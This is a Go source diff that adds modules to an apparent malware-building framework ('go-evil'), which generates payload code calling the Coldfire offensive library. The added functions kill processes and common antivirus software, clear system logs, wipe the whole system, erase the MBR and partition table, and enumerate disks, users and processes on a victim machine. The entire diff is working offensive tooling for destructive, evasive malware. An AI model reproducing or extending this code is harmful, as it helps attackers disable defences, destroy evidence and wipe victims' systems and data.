@@ -672,3 +672,303 @@ func create_user(value string, s_json string) ([]string, string) {
 
 	return []string{fmt.Sprintf("%s(%s, %s)", function_call, parameter_1, parameter_2)}, structure.Send(data_object)
 }
+
+//
+//
+// Tries to terminate a process based on it's pid
+// Input must therefore be the pid to utilize
+//
+//
+func kill_process_id(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "kill_process_id"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(repr_1 []int){", function_call),
+		"value1 := tools.String_to_int(spine.variable.get(spine.alpha.construct_string(repr_1)))",
+		"err := coldfire.PkillPid(value1)",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"}"})
+
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+
+	parameter_1 := tools.Generate_int_array_parameter(value)
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to terminate a process based on it's name
+// Input must therefore be the name to utilize
+//
+//
+func kill_process_name(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "kill_process_name"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(repr_1 []int){", function_call),
+		"value1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
+		"err := coldfire.PkillName(value1)",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"}"})
+
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+
+	parameter_1 := tools.Generate_int_array_parameter(value)
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to terminate the most common antiviruses
+//
+//
+func kill_antivirus(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "kill_antivirus"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+		"err := coldfire.PkillAv()",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"}"})
+
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to clear known logs on the system
+//
+//
+func clear_logs(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "clear_logs"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+		"err := coldfire.ClearLogs()",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"}"})
+
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to wipe the entire system
+//
+//
+func wipe_system(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "wipe_system"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+		"err := coldfire.Wipe()",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"}"})
+
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to wipe the mbr
+// Input is an evil array with the following format, ${"device", "erase partition table? (true/false)"}$
+//
+//
+func wipe_mbr(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "wipe_mbr"
+	arr := structure.Create_evil_object(value)
+
+	if arr.Length() != 2 {
+		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.move()")
+	}
+
+	device := arr.Get(0)
+	wipe_partition_table := tools.String_to_boolean(arr.Get(1))
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(repr_1 []int, repr_2 bool){", function_call),
+		"value1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
+		"err := coldfire.EraseMbr(value1, repr_2)",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"}"})
+
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+
+	parameter_1 := tools.Generate_int_array_parameter(device)
+
+	return []string{fmt.Sprintf("%s(%s, %t)", function_call, parameter_1, wipe_partition_table)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to grab all disks
+// Input None
+// The return is an evil array containing all found disks which is placed in a runtime variable
+//
+//
+func get_disks(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "get_disks"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+		"disks, err := coldfire.Disks()",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"arr := structure.Create_evil_object(\"\")",
+		"for _, d_disk := range disks{",
+		"arr.Append(d_disk)",
+		"}",
+		"spine.variable.set(arr.To_string(\"evil\"))",
+		"}"})
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to grab all users
+// Input None
+// The return is an evil array containing all found users which is placed in a runtime variable
+//
+//
+func get_users(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "get_users"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+		"users, err := coldfire.Users()",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"arr := structure.Create_evil_object(\"\")",
+		"for _, d_user := range users{",
+		"arr.Append(d_user)",
+		"}",
+		"spine.variable.set(arr.To_string(\"evil\"))",
+		"}"})
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to grab all processes
+// Input None
+// The return is an evil array containing all found users which is placed in a runtime variable
+//
+//
+func get_processes(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "get_processes"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+		"processes, err := coldfire.Processes()",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"arr := structure.Create_evil_object(\"\")",
+		"for pid, value := range processes{",
+		"arr.Append(fmt.Sprintf(\"%d - %s\", pid, value))",
+		"}",
+		"spine.variable.set(arr.To_string(\"evil\"))",
+		"}"})
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")
+	data_object.Add_go_import("fmt")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to grab all process names
+// Input None
+// The return is an evil array containing all found users which is placed in a runtime variable
+//
+//
+func get_processes_name(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "get_processes_names"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+		"processes, err := coldfire.Processes()",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"arr := structure.Create_evil_object(\"\")",
+		"for _, value := range processes{",
+		"arr.Append(value)",
+		"}",
+		"spine.variable.set(arr.To_string(\"evil\"))",
+		"}"})
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+}
+
+//
+//
+// Tries to grab all process id (pid)
+// Input None
+// The return is an evil array containing all found users which is placed in a runtime variable
+//
+//
+func get_processes_pid(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "get_processes_pid"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+		"processes, err := coldfire.Processes()",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
+		"arr := structure.Create_evil_object(\"\")",
+		"for pid, _ := range processes{",
+		"arr.Append(fmt.Sprintf(\"%d\", pid))",
+		"}",
+		"spine.variable.set(arr.To_string(\"evil\"))",
+		"}"})
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")
+	data_object.Add_go_import("fmt")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+}
